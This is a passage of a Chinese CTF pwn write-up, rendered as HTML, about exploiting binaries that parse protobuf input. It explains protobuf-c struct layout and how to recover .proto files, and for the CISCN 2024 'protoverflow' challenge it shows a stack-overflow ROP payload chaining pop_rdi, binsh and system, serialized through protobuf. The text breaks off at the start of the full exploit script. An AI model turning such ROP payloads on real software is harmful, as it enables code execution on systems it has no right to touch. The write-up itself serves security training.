+</span></span></span><span class="line"><span class="cl">    <span class="k">required</span> <span class="kt">int32</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span><span class="err">
+</span></span></span><span class="line"><span class="cl">    <span class="k">required</span> <span class="kt">string</span> <span class="n">sender</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span><span class="err">
+</span></span></span><span class="line"><span class="cl">    <span class="k">required</span> <span class="kt">uint32</span> <span class="n">len</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span><span class="err">
+</span></span></span><span class="line"><span class="cl">    <span class="k">required</span> <span class="kt">bytes</span> <span class="n">content</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span><span class="err">
+</span></span></span><span class="line"><span class="cl">    <span class="k">required</span> <span class="kt">int32</span> <span class="n">actionid</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"> <span class="p">}</span><span class="err">
+</span></span></span><span class="line"><span class="cl"> <span class="kd">message</span> <span class="nc">Message_response</span><span class="p">{</span><span class="err">
+</span></span></span><span class="line"><span class="cl">    <span class="k">required</span> <span class="kt">int32</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span><span class="err">
+</span></span></span><span class="line"><span class="cl">    <span class="k">required</span> <span class="kt">string</span> <span class="n">receiver</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span><span class="err">
+</span></span></span><span class="line"><span class="cl">    <span class="k">required</span> <span class="kt">int32</span> <span class="n">status_code</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span><span class="err">
+</span></span></span><span class="line"><span class="cl">    <span class="k">optional</span> <span class="kt">string</span> <span class="n">error_message</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"> <span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><p>但是生成的结构体：</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span>  <span class="n">_MessageRequest</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">ProtobufCMessage</span> <span class="n">base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int32_t</span> <span class="n">id</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">sender</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">uint32_t</span> <span class="n">len</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">ProtobufCBinaryData</span> <span class="n">content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int32_t</span> <span class="n">actionid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>发现在结构体的头部多了一个ProtobufCMessage类型的变量，查看一下这个类型的定义：</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">ProtobufCMessage</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/** The descriptor for this message type. */</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">ProtobufCMessageDescriptor</span>    <span class="o">*</span><span class="n">descriptor</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/** The number of elements in `unknown_fields`. */</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span>                <span class="n">n_unknown_fields</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/** The fields that weren&#39;t recognized by the parser. */</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ProtobufCMessageUnknownField</span>        <span class="o">*</span><span class="n">unknown_fields</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>它存储这个结构体的一些关键信息，比如Descriptor和未识别的字段。</p>
+<p><strong>ProtobufCMessage的大小为24字节</strong>，因此我们自己定义的字段下标应该是从3开始。</p>
+<p>那为什么会多出一个参数呢？</p>
+<p>查看编译后的代码发现，bytes类型被替换为了ProtobufCBinaryData类型，看一下它的定义：</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">ProtobufCBinaryData</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span>  <span class="n">len</span><span class="p">;</span>        <span class="cm">/**&lt; Number of bytes in the `data` field. */</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>      <span class="cm">/**&lt; Data bytes. */</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>它包括8字节的长度和8字节的数据部分，因此IDA识别时会多出一个参数。</p>
+<h3 class="heading-element" id="脚本"><span>脚本</span>
+  <a href="#%e8%84%9a%e6%9c%ac" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>写脚本要用到google对protobuf支持的第三方库。如果没安装，运行脚本时候会显示没有google库。</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-sh"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">pip3 install <span class="nv">protobuf</span><span class="o">==</span>3.20.3</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>这里protobuf的版本要用到3.20.x（只有1 2 3），如果没指定版本直接安装了最新版，运行脚本的时候python会提示版本不兼容，protobuf版本过低，要更新protobuf，否则使用3.20.x版本的python库。安装完这个之后，环境就算是配置好了。</p>
+<p>逆出proto文件后：</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">protoc --python_out=. message.proto</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>再导入就好了</p>
+<p>相关脚本：</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-python"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">message_pb2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pl</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x218</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">message</span> <span class="o">=</span> <span class="n">message_pb2</span><span class="o">.</span><span class="n">protoMessage</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">message</span><span class="o">.</span><span class="n">buffer</span> <span class="o">=</span> <span class="n">pl</span>
+</span></span><span class="line"><span class="cl"><span class="n">message</span><span class="o">.</span><span class="n">size</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">pl</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pl</span> <span class="o">=</span> <span class="n">message</span><span class="o">.</span><span class="n">SerializeToString</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">pl</span><span class="p">)</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>参考文章https://hackmd.io/@jsjsj/BkpBdW17kl</p>
+<p><a href="https://bbs.kanxue.com/thread-282203.htm" target="_blank" rel="external nofollow noopener noreferrer">https://bbs.kanxue.com/thread-282203.htm</a></p>
+<p><a href="https://xz.aliyun.com/news/15171" target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/news/15171</a></p>
+<p><a href="https://c-lby.top/2024/protobuf-install/" target="_blank" rel="external nofollow noopener noreferrer">https://c-lby.top/2024/protobuf-install/</a></p>
+<h3 class="heading-element" id="例题"><span>例题</span>
+  <a href="#%e4%be%8b%e9%a2%98" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 class="heading-element" id="ciscn-2024-华中赛区半决赛"><span>CISCN 2024 华中赛区半决赛</span>
+  <a href="#ciscn-2024-%e5%8d%8e%e4%b8%ad%e8%b5%9b%e5%8c%ba%e5%8d%8a%e5%86%b3%e8%b5%9b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><blockquote>
+<p>工具逆向</p>
+</blockquote>
+<p>创建软链接，然后程序就能运行了</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ln -s /home/ctf/pwn/CISCN/protoverflow/libprotobuf.so.10 /usr/lib/libprotobuf.so.10</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>反编译后发现一行代码:</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">v5</span> <span class="o">=</span> <span class="n">google</span><span class="o">::</span><span class="n">protobuf</span><span class="o">::</span><span class="n">MessageLite</span><span class="o">::</span><span class="nf">ParseFromArray</span><span class="p">((</span><span class="n">google</span><span class="o">::</span><span class="n">protobuf</span><span class="o">::</span><span class="n">MessageLite</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_209080</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>其实这行代码是在对传入的数据用<code>protocol buffers</code>的方式进行解密，所以我们传入的数据就需要用<code>protocol buffers</code>加密之后再传入，这样才能正常<code>parse</code></p>
+<p>把s中长度v6的内容<code>parse</code>后存入<code>&amp;unk_209080</code>。解析成功返回true</p>
+<blockquote>
+<p>相关的一些东西，不给题目中的是<code>ParseFromArray</code>：</p>
+<ul>
+<li><code>bool SerializeToString(string* output) const;</code>: serializes the message and stores the bytes in the given string. Note that the bytes are binary, not text; we only use the <code>string</code> class as a convenient container.</li>
+<li><code>bool ParseFromString(const string&amp; data);</code>: parses a message from the given string.</li>
+</ul>
+</blockquote>
+<p>用pbtk解析：</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-protobuf"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-protobuf" data-lang="protobuf"><span class="line"><span class="cl"><span class="n">syntax</span> <span class="o">=</span> <span class="s">&#34;proto2&#34;</span><span class="p">;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="kd">message</span> <span class="nc">protoMessage</span> <span class="p">{</span><span class="err">
+</span></span></span><span class="line"><span class="cl">    <span class="k">optional</span> <span class="kt">string</span> <span class="n">name</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span><span class="err">
+</span></span></span><span class="line"><span class="cl">    <span class="k">optional</span> <span class="kt">string</span> <span class="n">phoneNumber</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span><span class="err">
+</span></span></span><span class="line"><span class="cl">    <span class="k">required</span> <span class="kt">bytes</span> <span class="n">buffer</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span><span class="err">
+</span></span></span><span class="line"><span class="cl">    <span class="k">required</span> <span class="kt">uint32</span> <span class="n">size</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">protoc --python_out=. message.proto</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>然后使用这个语句编译成可以导入到python的文件</p>
+<p>得到对应文件之后，我们需要导入exp中</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import *
+</span></span><span class="line"><span class="cl">import message_pb2</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>漏洞点在<code>sub_324A</code>的memcpy栈溢出</p>
+<p>exp:</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-python"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">message_pb2</span>
